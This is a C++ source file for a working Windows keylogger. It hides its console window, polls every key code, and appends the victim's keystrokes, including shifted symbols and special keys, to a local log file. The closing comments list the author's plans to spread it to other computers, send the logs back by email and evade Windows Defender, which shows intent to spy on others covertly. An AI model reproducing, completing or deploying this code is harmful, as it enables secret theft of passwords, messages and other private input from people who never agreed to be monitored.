// Keylogger.cpp

#include <iostream> // For inputs and outputs cin cout
#include <fstream> // Allows to create files 
#include <windows.h> // Pull windows constants 

using namespace std;
void logkey();
int main() {
	logkey(); // Define function logkey
}

void logkey() {
	char keyp; // Where key pressed will be stored

	HWND hwnd = GetConsoleWindow(); //Code hides terminal popup runs in backround only stops with task manager
	ShowWindow(hwnd, SW_HIDE);

	while (true) {

		for (keyp = 0; keyp <= 254; keyp++) {  // Simple loop 

			if (GetAsyncKeyState(keyp) & 0x1) { //Fucntion That dectects windows keys 0x1 to see if key is currently pressed

				ofstream log;
				log.open("log.txt", ios::app);

				if (GetAsyncKeyState(VK_SHIFT) & 0x8000) { // Handle shifted symbols for numbers
					switch (keyp) {
					case '0':
						log << ")";
						break;
					case '1':
						log << "!";
						break;
					case '2':
						log << "@";
						break;
					case '3':
						log << "#";
						break;
					case '4':
						log << "$";
						break;
					case '5':
						log << "%";
						break;
					case '6':
						log << "^";
						break;
					case '7':
						log << "&";
						break;
					case '8':
						log << "*";
						break;
					case '9':
						log << "(";
						break;
					case VK_SHIFT: //Shift key does nothing we already seperate lower from uppercase
						break;
					default:
						log << keyp; //All other keys print normally
					}
				}

				else {
					switch (keyp) { //Using a switch to detech the windows specific keys not decected by getAsync (i.e. window keys constants) VK: Virtul Key Codes
									// Aint typing all that sh*t chtgpt all the windows keys constants and let it format it for me for each case/break
					case VK_LBUTTON:
						log << "";  //Dont need to see everytime someone left clicks clutters log
						break;
					case VK_RBUTTON:
						log << "";  //Same thing here 
						break;
					case VK_CANCEL:
						log << "(Cancel)";
						break;
					case VK_MBUTTON:
						log << "(Middle button)";
						break;
					case VK_BACK:
						log << "(Backspace)";
						break;
					case VK_TAB:
						log << "(Tab)";
						break;
					case VK_RETURN:
						log << "(Enter)";
						break;
					case VK_CONTROL:
						log << "(Control)";
						break;
					case VK_MENU:
						log << "(Alt)";
						break;
					case VK_PAUSE:
						log << "(Pause)";
						break;
					case VK_CAPITAL:
						log << "(Caps Lock)";
						break;
					case VK_ESCAPE:
						log << "(Escape)";
						break;
					case VK_SPACE:
						log << " "; // Replace Space with an actual Space
						break;
					case VK_PRIOR:
						log << "(Page Up)";
						break;
					case VK_NEXT:
						log << "(Page Down)";
						break;
					case VK_END:
						log << "(End)";
						break;
					case VK_HOME:
						log << "(Home)";
						break;
					case VK_LEFT:
						log << "(Left Arrow)";
						break;
					case VK_UP:
						log << "(Up Arrow)";
						break;
					case VK_RIGHT:
						log << "(Right Arrow)";
						break;
					case VK_DOWN:
						log << "(Down Arrow)";
						break;
					case VK_SELECT:
						log << "(Select)";
						break;
					case VK_PRINT:
						log << "(Print)";
						break;
					case VK_EXECUTE:
						log << "(Execute)";
						break;
					case VK_SNAPSHOT:
						log << "(Print Screen)";
						break;
					case VK_INSERT:
						log << "(Insert)";
						break;
					case VK_DELETE:
						log << "(Delete)";
						break;
					case VK_HELP:
						log << "(Help)";
						break;

					default:
						log << char(tolower(keyp)); 
					}
				}
			}
		}
	}
}


//Things I can work on
//How to send format this to be executable on other computers
//How to have log be emailed or sent back from others computers
//How to make more undetectable
//How not to be dectected by windows defender as a virus